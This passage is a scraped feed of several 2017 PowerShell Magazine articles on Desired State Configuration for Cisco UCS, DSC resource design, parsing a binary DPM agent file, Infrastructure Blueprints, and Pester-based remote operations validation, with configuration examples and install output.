Identifier =\u0026#34;4\u0026#34; DeleteNotPresent=$true #Sync all the LDAP groups by specifying the DN and Hierarchy true Hierarchy=$true Dn=\u0026#34;sys/ldap-ext\u0026#34; } In the above example I have specified the DN of the SP, SP Template, and the LDAP group. By specifying Ensure=”Present” the UcsSyncMoWithReference resource ensures that the MOs are created on the UCS domain. You can also specify what action to take in case if there are additional MOs than compared to the MOs present on the reference UCS. If you want to delete the additional MOs, you need to specify DeleteNotPresent= $true as done in the LDAP sync configuration in the above example. Refer to UCS Manager PowerTool User Guide for more details on the properties of the Resource.\nUcsManagedObject Custom Resource This is a generic resource provided to configure any MO in UCS Manager. To use this resource, you need to be familiar with the MO definitions and properties. One way to make use of this resource is by generating this configuration automatically as explained in the earlier section. If you are writing the configuration manually refer to the UCS Manager XML API Programmer’s Guide. Below is an example configuration of creating an Org in the UCS Manager. There are few key things to consider while creating the configuration, you need to specify the DN, XML API Class ID, and the Property Map.\nUcsManagedObject CreateOrganisationDemo { Ensure = \u0026#34;Present\u0026#34; ModifyPresent = $true ClassId= \u0026#34;orgOrg\u0026#34; Dn = \u0026#34;org-root/org-DSCDemoOrg\u0026#34; PropertyMap= \u0026#34;Descr = test for DSC with certificate `nName = DSCDemoOrg\u0026#34; UcsCredentials = $ucsCredential UcsConnectionString = $connectionString Identifier = \u0026#34;2\u0026#34; } You need to specify the properties of the managed object as key value pairs using the below format\n\u0026lt;key1\u0026gt;=\u0026lt;value1\u0026gt; \u0026lt;key\u0026gt;=\u0026lt;value2\u0026gt;\nUcsScript Custom Resource This is a generic resource provided to execute UCS Manager PowerTool cmdlets in a script. You can use this resource in cases where the configuration is complex and needs to be written as a script. You can also generate the configuration automatically for this resource as explained earlier. Below is an example configuration of renaming a Service Profile.\nUcsScript RenameServiceProfileDemo { Ensure = \u0026#34;Present\u0026#34; Dn = \u0026#34;org-root/ls-dscdemo\u0026#34; Script = \u0026#34;Get-UcsOrg -Level root | Get-UcsServiceProfile -Name \u0026#39;TestSP\u0026#39; -LimitScope | Rename-UcsServiceProfile -NewName \u0026#39;dscdemo\u0026#39; \u0026#34; UcsCredentials = $ucsCredential UcsConnectionString = $connectionString Identifier =\u0026#34;1\u0026#34; } If the configuration script is complex you can specify multiple DNs in a comma separated format.\nConfiguration Example This section details how you can put together all the things in a DSC configuration document.\nFor all the examples mentioned above you need to specify environment settings, UCS Connection details and Credentials.\nUCS connection string needs to be specified in the following format.\nName=\u0026lt;ipAddress\u0026gt; [`nNoSsl=\u0026lt;bool\u0026gt;][`nPort=\u0026lt;ushort\u0026gt;] [`nProxyAddress=\u0026lt;proxyAddress\u0026gt;] [`nUseProxyDefaultCredentials=\u0026lt;bool\u0026gt;] UCS Manager credentials needs to be specified as a PSCredential object. You can use certificates for encrypting the credentials to keep it secure. For information on using certificates for encryption refer to Microsoft DSC documentation.\nBelow is an example configuration which has all the details.\n$ConfigData= @{ AllNodes = @( @{ # The name of the node we are describing NodeName =\u0026#34;10.105.219.128\u0026#34; # The path to the .cer file containing the # public key of the Encryption Certificate # used to encrypt credentials for this node CertificateFile = \u0026#34;C:\\Certificate\\MyCertificate.cer\u0026#34; # The thumbprint of the Encryption Certificate # used to decrypt the credentials on target node Thumbprint = \u0026#34;558CF40844CDC6303D25494FB007189F75BEE060\u0026#34; }; ); } Configuration AutoGeneratedConfig { param ( [Parameter(Mandatory=$true)] [PsCredential] $ucsCredential, [Parameter(Mandatory=$true)] [string] $connectionString ) Import-DSCResource -ModuleName Cisco.Ucs.DesiredStateConfiguration Node \u0026#34;10.105.219.128\u0026#34; { LocalConfigurationManager { CertificateId = $node.Thumbprint ConfigurationMode = \u0026#39;ApplyOnly\u0026#39; RefreshMode = \u0026#39;Push\u0026#39; } UcsManagedObject UcsManagedObject1 { Ensure = \u0026#34;Present\u0026#34; ModifyPresent = $true ClassId= \u0026#34;equipmentLocatorLed\u0026#34; Dn = \u0026#34;sys/chassis-1/blade-1/locator-led\u0026#34; PropertyMap= \u0026#34;Id = 1 `nBoardType = single `nAdminState = on\u0026#34; UcsCredentials = $ucsCredential UcsConnectionString = $connectionString Identifier = \u0026#34;1\u0026#34; } UcsManagedObject ucsManagedobject2 { Ensure = \u0026#34;Present\u0026#34; ModifyPresent = $true ClassId= \u0026#34;orgOrg\u0026#34; Dn = \u0026#34;org-root/org-SubOrg2\u0026#34; PropertyMap= \u0026#34;Descr = test for DSC with certificate `nName = SubOrg2\u0026#34; UcsCredentials = $ucsCredential UcsConnectionString = $connectionString Identifier = \u0026#34;2\u0026#34; } } } try { ${Error}.Clear() $credential = Get-Credential AutoGeneratedConfig -ConfigurationData $ConfigData ` -ucsCredential $credential ` -connectionString \u0026#34;Name=10.65.183.5\u0026#34; ` -OutputPath \u0026#34;C:\\DscDemo\\AutoGeneratedConfig\u0026#34; } Catch { Write-Host ${Error} exit } When you run this script PowerShell will generate the corresponding MOF files. You can deploy the configuration based on the LCM configuration mode. If it is set to Push mode, then you can enact the configuration using the below syntax.\nStart-DscConfiguration -Path \u0026#34;C:\\DscDemo\\AutoGeneratedConfig\\\u0026#34; -Wait -Verbose -force ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2017/05/29/cisco-ucs-custom-resource-for-the-windows-powershell-desired-state-configuration-dsc/","tags":["Cisco","PowerShell DSC"],"title":"Cisco UCS Custom Resource for the Windows PowerShell Desired State Configuration (DSC)"},{"categories":["DevOps","PowerShell DSC"],"contents":"In the last part of this series, we looked at why resource granularity is important. In this part, we will see the difference between configuration items and orchestration steps.\nWhen using any configuration management platform or a tool, the imperative resource modules, that “make it so”, are the most important. The declarative configuration documents combine the resource definitions and the imperative scripts get called behind the scenes to do the job. Now, it can be very tempting to write a resource for everything going by the resource granularity principle. But, this is where we need to apply some filters. There are many such filters but let’s first start with the configuration vs orchestration filter which is the subject of this article.\nTake a look at this flowchart for an example.\nThe flowchart above is about deploying OS through automated processes in my lab. This is very high-level and abstracted. Notice the step before complete OS deploy. We need to set the bare metal system to perform one time PXE boot so that the WDS server kick starts the WinPE boot and completes required OS deployment steps. In a scenario where you have artifacts developed for even bare metal configuration, it is certainly possible to put this one time PXE boot also as a resource configuration. After all, it is just BIOS attribute configuration.\nI have put together an example for this.\n$configData = @{ AllNodes = @( @{ NodeName = \u0026#39;localhost\u0026#39; PSDscAllowPlainTextPassword = $true } ) } Configuration PEPXEBootDemo { Import-DscResource -ModuleName DellPEWsManTools -Name PEOneTimeBoot Import-DscResource -ModuleName PSDesiredStateConfiguration Node $AllNodes.NodeName { PEOneTimeBoot PEPXEBootDemo { Id = \u0026#39;Node17-UniqueBoot\u0026#39; DRACIPAddress = \u0026#39;172.16.100.17\u0026#39; DRACCredential = (Get-Credential) OneTimeBootMode = \u0026#39;Enabled\u0026#39; OneTimeBootDevice = \u0026#39;NIC.PxeDevice.1-1\u0026#39; } } } PEPXEBootDemo -ConfigurationData $configData The above configuration document uses the PEOneTimeBoot resource from the DellPEWSManTools resource module. The PEOneTimeBoot is a proxy DSC resource.\nHere is what it does when we enact this configuration.\nAll is well and good. Once the bare metal system restarts, it boots into PXE and completes OS deployment. Now, here is the interesting part. If I use the Test-DscConfiguration cmdlet to check if my node is in desired state or not, here is what I see.\nThere is a configuration drift. And, it will always be like this. This is because the PEOneTimeBoot resource is configuring a BIOS attribute that is short lived. It gets reset or gets disabled after the configuration is complete. So, when we check the attribute after the configuration enact is complete, the Test-DscConfiguration will always find that this resource has drifted from the expected configuration. When we aggregate the resource desired state at the complete system level, this drift in PEOneTimeBoot will roll up as drift at the whole system level. And, this is what makes this, PEOneTimeBoot, an incorrect choice for creating a DSC resource.\nIn practice, this is an orchestration step and not a configuration item. As a part of the deployment process orchestration, we would need an orchestration step that PXE boots the bare metal system for OS deployment to complete and then perform any other post-OS configuration tasks using DSC.\nTherefore when designing and developing a DSC resource module, apply this filter to check if the resource configuration in question is short lived. In other terms, check if the resource configuration implies to be an orchestration step or a configuration item.\nStay tuned for more in this series!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2017/05/24/psdsc-doing-it-right-configuration-vs-orchestration/","tags":["DevOps","PowerShell DSC"],"title":"#PSDSC Doing It Right – Configuration vs Orchestration"},{"categories":["DevOps","PowerShell DSC"],"contents":"This is the first article in the #PSDSC Doing It Right series. This series of articles will introduce you to some of the best practices we have learned through some real-world implementations of PowerShell DSC-based configuration management. Read on!\nThere are several custom DSC resource modules available either via the official PowerShell team’s DSC resource kit or via other community repositories. There are guidelines on contributing to the official resource kit. This includes a set of requirements for creating High Quality DSC Resource modules and the style guidelines that must be followed when creating these High Quality Resource Modules.\nThese guidelines only discuss how you should structure the DSC resource modules, how and what type of tests you should include, how you must document your module, and what coding style guidelines should be followed, and so on but not how you should design your resource module and what a resource within the module should represent. This is not just about logic in the resource module’s imperative scripts but what and how those imperative scripts configure. In other words, the granularity of resource configuration should be one of the design considerations when writing resource modules.\nLet’s look at an example to understand this.\nHere is the xVMHyperV resource in xHyper-V module. This resource has a bunch of properties and supports creation of a VM and some of its related components such as network adapters.\nIf I look at the properties listed here, I see a few issues with the way this resource is designed.\n This resource takes an array of switch names (SwitchName property) and then attaches a network adapter for each switch that is specified in the resource instance configuration. This takes care of adding new adapters in future through the same configuration. However, it fails when you want to remove an adapter. Even if you want to implement that logic in the same resource, it becomes complex. While there is support for multiple network adapters, there is no VLAN ID configuration available in the resource. There is no way we can configure other network adapter settings such as bandwidth settings, DHCP Guard, and other supported configuration settings. This module does a lot of heavy lifting when it comes to virtual hard drive and dynamic memory configurations. However, there is no VHDX Q0S configuration that is possible.  While this resource takes care of certain VM settings, it excludes many of the other VM settings. Adding all this support within the same xVMHyperV resource module will only increase its complexity. Instead, separating out the configuration into multiple smaller resource modules would be a good design.\nOne of the things that I consider when starting out with developing a new resource module is to first understand the resource itself. Let us look at the VM example again. Here is how I would represent the VM and its related components in a hierarchical manner.\nOnce I have this representation, I look at what items in the hierarchy are best suited to be resource on their own. For example, processor in the VM context need not a resource on its own. When we create a new VM, we generally assign number of virtual CPU and that is it. But, the processor settings such as Resource Control, NUMA Topology and so on can be packaged into a different resource so that the VM resource need not worry about having all the logic to manage these special configuration settings. The same thought process applies to VM memory as well. I want to be able to manage the dynamic memory settings only when I need and not package them into the VM resource configuration.\nHowever, when it comes to a network adapter, I want to add or remove network adapters without really touching the VM resource configuration. And, configure other settings for these network adapters when I need them. So, I would create separate resources for network adapters and their associated settings.\nSimply put, the more complex your resource becomes, the more complex your tests need to be. Without proper tests for a complex resource, you end up creating something that is substandard. Period.\nThe granular resource design gives me flexibility while reducing the complexity. You may argue that the configuration documents tend to become very long and difficult to write with so many granular resources just to create a single VM. Yes, if you are doing this only one time, it shouldn’t matter. But, if you plan to reuse these configurations, composite resources solve this exact problem. I combine long and complex configurations into composite resources and use them very often. These composite resources become my infrastructure blueprints.\nHere is how my SimpleVM resource looks like.\nNote: This is not yet in my public release of cHyper-V module. If you want to give this a try, just give a shout and I will be able to invite you to try a few more things along with this.\nThis SimpleVM resource provides functionality that is good enough to create a VM that has a VHD attached and the required memory and CPU configuration. You can choose to leave the default network adapter or remove it if you want to use the xVMNetworkAdapter to add one or more resources separately.\nUsing this method for resource design also helped me create resources that are used for different types of components. Consider my xNetAdapterRDMA resource for an example. This resource is used to enable or disable RDMA on a network adapter. This is a very simple resource. It just flips the RDMA configuration on a network adapter.\nI have also written the xVMNetworkAdapter resource which adds/removes VM network adapters in the management OS or to the virtual machines. So, when I have to add a VM network adapter that is RDMA capable, I could have implemented the logic to make it so in the xVMNetworkAdapter itself. But, that design, while making the resource complex, would prevent me from using the same functionality with physical adapters. So, if I were to configure physical adapter RDMA settings, I would have ended up writing a different resource or do it some other way. Instead, I chose to separate the RDMA configuration into its own module so that I can share that functionality across different types of network adapters.\nTo summarize, when designing a resource module, you should look at how and what the resource would do and structure your module in a way that allows flexible resource configurations.\nStay tuned for more in this series.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2017/05/23/psdsc-doing-it-right-resource-granularity/","tags":["DevOps","PowerShell DSC"],"title":"#PSDSC Doing It Right – Resource Granularity"},{"categories":["How To"],"contents":"This article is co-authored by Jan Egil Ring and Ø__yvind Kallstad\nIn this article, we will look at how binary files can be interpreted in PowerShell by looking at a real world challenge as an example.\nThe challenge In System Center Data Protection Manager (DPM), there is an agent installed on protected computers for managing backup and restore operations. If there is a lot of DPM servers in the environment and you do not know what DPM server is protecting an agent, you need a way to find this information on the local machine where the DPM agent is installed on. You might want to look at all the DPM servers, but the agent might be inactive and left over from a decommissioned DPM server.\nThere aren`t any official references on this topic besides some guidance in a forum thread on the TechNet Forums:\nOpen an administrative command prompt, then run:\nC:\\\u0026gt; type C:\\Program Files\\Microsoft Data Protection Manager\\DPM\\ActiveOwner* The beginning of the first line returned will be the FQDN in Unicode of the DPM Server owning the agent on the protected server/client\nLet’s try:\nThis gives us the information we want, but not in a very convenient format. Optimally, we would like to gather this information remotely via PowerShell remoting and get an object back with information about the DPM agent. This could be a function containing version information in addition to the name of the DPM server(s) an agent is attached to.\nIn PowerShell we can use Get-Content (or its alias type) to get the same information:\nAt this point, I was thinking that regular expressions might be an appropriate way to solve this challenge. I presented the challenge to my colleague Øyvind, which had experience working with binary files like this in PowerShell.\nWorking with binary files Usually you would want to have some kind of documentation of the file format in question before trying to parse a binary file format. Unfortunately, we couldn’t find any for this file type. However, it seems from reading the file contents raw, that the information we want is right at the beginning of the file format. If you look at the raw format representation of the string we want to extract, you see that each character has a space between them. This tells us that it’s a Unicode encoded string.\nIt’s useful to use a dedicated hex editor when working with binary file types. In the following screenshot, I’m using the 010 Editor, and as you can see the editor have confirmed our suspicion that the text is in Unicode format.\nWhat we don’t know is length of this field, so we must do some guess work. Since this information is referring to a hostname or a domain name, we can assume it’s not going to contain any spaces. We also hope that there will be at least one space between this field and the next one. Building on these assumptions, we can create a do-while loop that keeps reading bytes until we encounter a byte that when converted to a Unicode string equals to an empty string. The resulting string should be the data that we are after.\nNote that since we are reading Unicode-encoded strings, we need to read 2 bytes in each pass.\nThe way to read data from a binary file is to set up a BinaryReader object. This class has the ReadBytes method that we will use to read bytes from the binary stream.\nWe also need some way of converting the binary data to something meaningful. Since we already have identified the data as Unicode string, we can use the Unicode.GetString static method in the System.Text.Encoding class in .NET for this.\nThat’s all we really need for this particular case. You can find the full code at https://gist.github.com/janegilring/afec8213d3d14e4f436d0f9d88804f74\nIf you are interested in learning more about how to parse data from binary file formats, Øyvind did a talk about this at PowerShell Conference Europe 2017. The video recording of the talk is available here.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2017/05/22/working-with-binary-files-in-powershell/","tags":["How To"],"title":"Working with binary files in PowerShell"},{"categories":["DevOps","PowerShell DSC"],"contents":"A while ago, I wrote an article to introduce Infrastructure Blueprints. Today’s post is about a more refined version of that project. These infrastructure blueprints are the starting point for a bigger discussion on dynamic infrastructure. We will discuss that later. Read on!\nWithin the Infrastructure as Code (IaC) practices, there is enough emphasis on the repeatable and reusable automation enabled using configuration management tools. This is referred to as configuration as Code. Configuration as Code enables consistent methods to configure IT systems. And, when we integrate these processes into DevOps practices, we can ensure that the configuration across different stages of the deployment (Development / Test / Staging / Production) can be done in a efficient and consistent manner.\nOne of the best practices in Configuration as Code practice is to ensure that the configurations that we deploy are made reusable. This means that the configurations are parameterized and have the environmental data separated from the structural configuration data.\nPowerShell Desired State Configuration (DSC) supports the separation of environmental configuration from structural configuration using the configuration data artifacts. And, sharing of parameterized configurations is done using the composite configuration modules or what we call composite resources. Composite configurations are very useful when a node configuration requires a combination multiple resources and becomes long and complex.\nFor example, building a Hyper-V cluster includes configuring host networking, domain join, updating firewall rules, creating/joining a cluster, and so on. Each node in the cluster should have this configuration done in a consistent manner. Therefore, the configurations that are applied for each of these items can be made reusable using the composite configuration methods.\nAlso, a real-world deployment pipeline implemented using IaC practices should also have validation of the infrastructure configuration at various stages of the deployment. In the PowerShell world, this is done using Pester. Within DSC too, Pester plays a very important role in validating the desired state after a configuration is applied and in the operations validation space.\nInfrastructure Blueprints The infrastructure blueprints project provides guidelines on enabling reusable and repeatable DSC configurations combined with Pester validations that are identified by Operations Validation Framework. As a part of this repository, there will be a set of composite resource modules for various common configurations that you will see in a typical IT infrastructure.\nInfrastructure Blueprints are essentially composite resource packages that contain node configurations and Pester tests that validate desired state and integration after the configuration is applied.\nThis repository contains multiple composite configuration modules. Each module contains multiple composite resources with ready to use examples and tests that validate the configuration.\nThe following folder structure shows how these composite modules are packaged.\n Diagnostics folder contains the Simple and Comprehensive tests for performing operations validation.  Simple: A set of tests that validate the functionality of infrastructure at the desired state. Comprehensive: A set of tests that perform a comprehensive operations validation of the infrastructure at the desired state. For ease of identification, the test script names include Simple or Comprehensive within the file name.    The Operations Validation Framework can be used to retrieve the list of tests in this module and invoke the relevant ones.\nOnce you know the composite resource that is applied on the system, you can invoke either simple or comprehensive tests using the Invoke-OperationValidation cmdlet.\n Examples folder contains a sample configuration data foreach composite configuration and also a configuration document that demonstrates how to use the composite resource. CompositeModuleName.psd1 is the module manifest for the composite configuration module.  This manifest contains the RequiredModules key that has all the required modules for the composite configuration to work. This is listed as a module specification object. For example, the RequiredModules key for Hyper-VConfigurations composite module contains the following hashtable.\n# Modules that must be imported into the global environment prior to importing this module RequiredModules = @( @{ModuleName=\u0026#39;cHyper-v\u0026#39;;ModuleVersion=\u0026#39;3.0.0.0\u0026#39;}, @{ModuleName=\u0026#39;xNetworking\u0026#39;;ModuleVersion=\u0026#39;2.12.0.0\u0026#39;} ) These composite modules are available in the PowerShell Gallery as well. And, therefore, having the RequiredModules in the module manifest enables automatic download of all module dependencies automatically.\nPS C:\\\u0026gt; Install-Module -Name Hyper-VConfigurations -Force -Verbose VERBOSE: Using the provider \u0026#39;PowerShellGet\u0026#39; for searching packages. VERBOSE: The -Repository parameter was not specified. PowerShellGet will use all of the registered repositories. VERBOSE: Getting the provider object for the PackageManagement Provider \u0026#39;NuGet\u0026#39;. VERBOSE: The specified Location is \u0026#39;https://www.powershellgallery.com/api/v2/\u0026#39; and PackageManagementProvider is \u0026#39;NuGet\u0026#39;. VERBOSE: Searching repository \u0026#39;https://www.powershellgallery.com/api/v2/FindPackagesById()?id=\u0026#39;Hyper-VConfigurations\u0026#39;\u0026#39; for \u0026#39;\u0026#39;. VERBOSE: Total package yield:\u0026#39;1\u0026#39; for the specified package \u0026#39;Hyper-VConfigurations\u0026#39;. VERBOSE: Performing the operation \u0026#34;Install-Module\u0026#34; on target \u0026#34;Version \u0026#39;1.0.0.0\u0026#39; of module \u0026#39;Hyper-VConfigurations\u0026#39;\u0026#34;. VERBOSE: The installation scope is specified to be \u0026#39;AllUsers\u0026#39;. VERBOSE: The specified module will be installed in \u0026#39;C:\\Program Files\\WindowsPowerShell\\Modules\u0026#39;. VERBOSE: The specified Location is \u0026#39;NuGet\u0026#39; and PackageManagementProvider is \u0026#39;NuGet\u0026#39;. VERBOSE: Downloading module \u0026#39;Hyper-VConfigurations\u0026#39; with version \u0026#39;1.0.0.0\u0026#39; from the repository \u0026#39;https://www.powershellgallery.com/api/v2/\u0026#39;. VERBOSE: Searching repository \u0026#39;https://www.powershellgallery.com/api/v2/FindPackagesById()?id=\u0026#39;Hyper-VConfigurations\u0026#39;\u0026#39; for \u0026#39;\u0026#39;. VERBOSE: Searching repository \u0026#39;https://www.powershellgallery.com/api/v2/FindPackagesById()?id=\u0026#39;cHyper-v\u0026#39;\u0026#39; for \u0026#39;\u0026#39;. VERBOSE: Searching repository \u0026#39;https://www.powershellgallery.com/api/v2/FindPackagesById()?id=\u0026#39;xNetworking\u0026#39;\u0026#39; for \u0026#39;\u0026#39;. VERBOSE: InstallPackage\u0026#39; - name=\u0026#39;cHyper-V\u0026#39;, version=\u0026#39;3.0.0.0\u0026#39;,destination=\u0026#39;C:\\Users\\ravikanth_chaganti\\AppData\\Local\\Temp\\1037779645\u0026#39; VERBOSE: DownloadPackage\u0026#39; - name=\u0026#39;cHyper-V\u0026#39;, version=\u0026#39;3.0.0.0\u0026#39;,destination=\u0026#39;C:\\Users\\ravikanth_chaganti\\AppData\\Local\\Temp\\1037779645\\cHyper-V\\cHyper-V.nupkg\u0026#39;, uri=\u0026#39;https://www.powershe llgallery.com/api/v2/package/cHyper-V/3.0.0\u0026#39; VERBOSE: Downloading \u0026#39;https://www.powershellgallery.com/api/v2/package/cHyper-V/3.0.0\u0026#39;. VERBOSE: Completed downloading \u0026#39;https://www.powershellgallery.com/api/v2/package/cHyper-V/3.0.0\u0026#39;. VERBOSE: Completed downloading \u0026#39;cHyper-V\u0026#39;. VERBOSE: InstallPackageLocal\u0026#39; - name=\u0026#39;cHyper-V\u0026#39;, version=\u0026#39;3.0.0.0\u0026#39;,destination=\u0026#39;C:\\Users\\ravikanth_chaganti\\AppData\\Local\\Temp\\1037779645\u0026#39; VERBOSE: InstallPackage\u0026#39; - name=\u0026#39;xNetworking\u0026#39;, version=\u0026#39;3.2.0.0\u0026#39;,destination=\u0026#39;C:\\Users\\ravikanth_chaganti\\AppData\\Local\\Temp\\1037779645\u0026#39; VERBOSE: DownloadPackage\u0026#39; - name=\u0026#39;xNetworking\u0026#39;, version=\u0026#39;3.2.0.0\u0026#39;,destination=\u0026#39;C:\\Users\\ravikanth_chaganti\\AppData\\Local\\Temp\\1037779645\\xNetworking\\xNetworking.nupkg\u0026#39;, uri=\u0026#39;https://www .powershellgallery.com/api/v2/package/xNetworking/3.2.0\u0026#39; VERBOSE: Downloading \u0026#39;https://www.powershellgallery.com/api/v2/package/xNetworking/3.2.0\u0026#39;. VERBOSE: Completed downloading \u0026#39;https://www.powershellgallery.com/api/v2/package/xNetworking/3.2.0\u0026#39;. VERBOSE: Completed downloading \u0026#39;xNetworking\u0026#39;. VERBOSE: InstallPackageLocal\u0026#39; - name=\u0026#39;xNetworking\u0026#39;, version=\u0026#39;3.2.0.0\u0026#39;,destination=\u0026#39;C:\\Users\\ravikanth_chaganti\\AppData\\Local\\Temp\\1037779645\u0026#39; VERBOSE: InstallPackage\u0026#39; - name=\u0026#39;Hyper-VConfigurations\u0026#39;, version=\u0026#39;1.0.0.0\u0026#39;,destination=\u0026#39;C:\\Users\\ravikanth_chaganti\\AppData\\Local\\Temp\\1037779645\u0026#39; VERBOSE: DownloadPackage\u0026#39; - name=\u0026#39;Hyper-VConfigurations\u0026#39;, version=\u0026#39;1.0.0.0\u0026#39;,destination=\u0026#39;C:\\Users\\ravikanth_chaganti\\AppData\\Local\\Temp\\1037779645\\Hyper-VConfigurations\\Hyper-VConfigura tions.nupkg\u0026#39;, uri=\u0026#39;https://www.powershellgallery.com/api/v2/package/Hyper-VConfigurations/1.0.0\u0026#39; VERBOSE: Downloading \u0026#39;https://www.powershellgallery.com/api/v2/package/Hyper-VConfigurations/1.0.0\u0026#39;. VERBOSE: Completed downloading \u0026#39;https://www.powershellgallery.com/api/v2/package/Hyper-VConfigurations/1.0.0\u0026#39;. VERBOSE: Completed downloading \u0026#39;Hyper-VConfigurations\u0026#39;. VERBOSE: InstallPackageLocal\u0026#39; - name=\u0026#39;Hyper-VConfigurations\u0026#39;, version=\u0026#39;1.0.0.0\u0026#39;,destination=\u0026#39;C:\\Users\\ravikanth_chaganti\\AppData\\Local\\Temp\\1037779645\u0026#39; VERBOSE: Installing the dependency module \u0026#39;cHyper-V\u0026#39; with version \u0026#39;3.0.0.0\u0026#39; for the module \u0026#39;Hyper-VConfigurations\u0026#39;. VERBOSE: Module \u0026#39;cHyper-V\u0026#39; was installed successfully. VERBOSE: Installing the dependency module \u0026#39;xNetworking\u0026#39; with version \u0026#39;3.2.0.0\u0026#39; for the module \u0026#39;Hyper-VConfigurations\u0026#39;. VERBOSE: Module \u0026#39;xNetworking\u0026#39; was installed successfully. VERBOSE: Module \u0026#39;Hyper-VConfigurations\u0026#39; was installed successfully. As you can see in the above Install-Module cmdlet output, the required modules are downloaded from the gallery. Thanks to Chrissy for this tip.\nYou can contribute to this project by submitting a pull request. All you need a set of composite resource modules packaged as a PowerShell module with DSC resources. Of course, ensure you add clear examples and tests.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2017/05/15/infrastructure-blueprints-a-way-to-share-psdsc-configurations/","tags":["DevOps","PowerShell DSC"],"title":"Infrastructure Blueprints – An Easier and Better Way to Share #PSDSC Configurations"},{"categories":["Module Spotlight","DevOps","Pester"],"contents":"Before we get started with what is PSRemotely, here is some background.\nAs part of my work in an engineering team, I am tasked with writing scripts which will validate the underlying infrastructure before the automation (using PowerShell DSC) kicks in to deploy the solution.\nBelow are the different generic phases which comprise the whole automation process:\n Pre-deployment – getting the base infrastructure ready, the bare minimum required for automation. For example – network configuration on the nodes is needed. Deployment – deployment of the solution leveraging PowerShell DSC. Post-deployment – scripts/runbooks configuring or tweaking the environment.  What I meant by validating underlying infrastructure above, is that the compute and storage physical hosts/nodes have a valid IP configuration, connectivity to the AD/DNS infrastructure etc. the key components that we required to be tested and validated to get confidence in our readiness to deploy the engineered solution on top of it.\nNote – Our solution had scripts in place that would configure the network based on some input parameters and record this in a manifest XML file. After the script ran, we would assume that everything is in place. These assumptions at some points cost us a lot of efforts in troubleshooting.\nIn short, initial idea was to have scripts validating, what the scripts did in an earlier step. So it began, I started writing PowerShell functions, using workflows (to target parallel execution on nodes). This was a decent solution until there were requests to add validation tests for entirely everything in the solution stack e.g. DNS configuration, network connectivity, proxy configuration, disks (SSD/HDD) attached to the storage nodes etc.\nPhew! It was a nightmare maintaining it.\nRays of hope: Pester, PoshSpec, and Remotely!\nWe went into looking at how to use some of the open source PowerShell modules into helping us perform operations validation. At this time in community, Pester was gaining traction for the operations validation.\nUsing Pester We moved away from using standalone scripts for the operations validation and started converting our scripts into Pester tests. It is not surprising to see that many operations people find it easier to relate to using Pester for Ops validation, since we have been doing this validation for ages manually. Pester just makes it easy to automate all of it.\nFor example, in our solution each compute node gets three NIC cards, pre-deployment script configures them. If we had to test whether the network adapter’s configuration was indeed correct, it would look something like below using Pester:\nDescribe \u0026#34;TestIPConfiguration\u0026#34; { It \u0026#34;Should have a valid IP address on the Management NIC\u0026#34; { (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias \u0026#39;vEthernet(Management)\u0026#39; | Select-Object -ExpandProperty IPAddress) | Should be \u0026#39;10.10.10.1\u0026#39; } It \u0026#34;Should have a valid IP address on the Storage1 NIC\u0026#34; { (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias \u0026#39;vEthernet(Storage1)\u0026#39; | Select-Object -\tExpandProperty IPAddress) | Should be \u0026#39;10.20.10.1\u0026#39; } It \u0026#34;Should have a valid IP address on the Storage2 NIC\u0026#34; { (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias \u0026#39;vEthernet(Storage1)\u0026#39; | Select-Object -\tExpandProperty IPAddress) | Should be \u0026#39;10.30.10.1\u0026#39; } Using PoshSpec \u0026amp; Pester PoshSpec added yet another layer of abstraction on our infrastructure tests by adding yet another DSL.\nBelow is how our tests started looking with usage of Pester and PoshSpec.\nNote – For validation of IPv4 Address, another keyword named IPv4Address was added to PoshSpec which would essentially call Get-NetIPAddress and spit out the IPv4 address assigned on the NIC interface with specified alias.\nDescribe \u0026#34;TestIPConfiguration\u0026#34; { Context \u0026#34;Validate the Management NIC \u0026#34; { IPv4Address \u0026#39;vEthernet(Management)\u0026#39; {Should be \u0026#39;10.10.10.1\u0026#39;} } Context \u0026#34;Validate the Storage1 NIC\u0026#34; { IPv4Address \u0026#39;vEthernet(Storage1)\u0026#39; {Should be \u0026#39;10.20.10.1\u0026#39;} } Context \u0026#34;Validate the Storage2 NIC\u0026#34; { IPv4Address \u0026#39;vEthernet(Storage2)\u0026#39; {Should be \u0026#39;10.30.10.1\u0026#39;} } } By using Pester and PoshSpec to write tests, it sure made maintaining these tests easy, but we still have a problem at\nhand. How do we target our above tests to all the nodes in the solution?\nRemotely?? At some point Ravi was tinkering with this particular PowerShell module and suggested to take a look at it. It was promising to begin with as he added support for passing Credential hash to Remotely. We would have to specify a hash table with the computer name as key and credential as value to Remotely and it would take care of connecting to those nodes, executing the script block in the remote runspace. At this point things started falling in place for what we had in mind. Our tests started looking nice and concise:\n$CredHash = @{ \u0026#39;ComputeNode1\u0026#39; = Get-Credential \u0026#39;ComputeNode2\u0026#39; = Get-Credential } Describe \u0026#34;TestIPConfiguration\u0026#34; { Context \u0026#34;Validate the Management NIC \u0026#34; { Remotely ComputeNode1, ComputeNode2 {IPv4Address \u0026#39;vEthernet(Management)\u0026#39; {Should be \u0026#39;10.10.10.1\u0026#39;}} } Context \u0026#34;Validate the Storage1 NIC\u0026#34; { Remotely ComputeNode1, ComputeNode2 {IPv4Address \u0026#39;vEthernet(Storage1)\u0026#39; {Should be \u0026#39;10.20.10.1\u0026#39;}} } Context \u0026#34;Validate the Storage2 NIC\u0026#34; { Remotely ComputeNode1, ComputeNode2 {IPv4Address \u0026#39;vEthernet(Storage2)\u0026#39; {Should be \u0026#39;10.30.10.1\u0026#39;}} } } Soon we realized that the Assertions above e.g. {Should Be ’10.10.10.1’} are to be dynamically created by reading the manifest XML file which drives the whole deployment. It contains what is the expected configuration on the remote nodes.\nWe wanted our tests to be generic so that we could target them to all nodes part of the solution. We were looking to have our tests organized like below, where of course a node-specific details e.g. $ManagementIPv4Address etc. would be read from the manifest file and created on the fly either on the local machine or remote node :\n$CredHash = @{ \u0026#39;ComputeNode1\u0026#39; = Get-Credential \u0026#39;ComputeNode2\u0026#39; = Get-Credential } Describe \u0026#34;TestIPConfiguration\u0026#34; { Context 